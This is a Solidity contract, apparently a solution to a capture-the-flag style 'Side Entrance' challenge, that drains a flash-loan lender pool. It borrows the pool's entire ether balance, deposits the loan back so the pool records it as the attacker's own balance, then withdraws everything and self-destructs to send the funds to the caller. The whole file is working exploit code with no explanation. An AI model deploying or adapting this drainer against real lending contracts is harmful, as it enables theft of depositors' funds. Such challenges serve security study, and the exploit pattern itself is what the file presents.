pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

import "./SideEntranceLenderPool.sol";

contract SideEntranceDrainer is IFlashLoanEtherReceiver {
    using Address for address payable;

    SideEntranceLenderPool immutable pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function attack() external {
        uint256 balance = address(pool).balance;
        pool.flashLoan(balance);
        pool.withdraw();
        selfdestruct(payable(msg.sender));
    }

    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }

    receive () external payable {}
}
